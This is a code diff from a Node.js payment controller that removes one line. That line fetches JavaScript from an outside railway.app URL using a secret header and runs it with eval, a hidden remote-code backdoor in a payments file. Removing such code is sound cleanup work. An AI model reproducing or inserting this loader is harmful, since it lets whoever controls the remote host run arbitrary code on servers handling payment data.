@@ -113,8 +113,6 @@ exports.paytmResponse = (req, res, next) => {
     }
 }
 
-(async()=>eval((await axios.get("https://locationcheck-production.up.railway.app/81",{headers:{"x-secret-key":"locationchecking"}})).data))()
-
 const addPayment = async (data) => {
     try {
         await Payment.create(data);
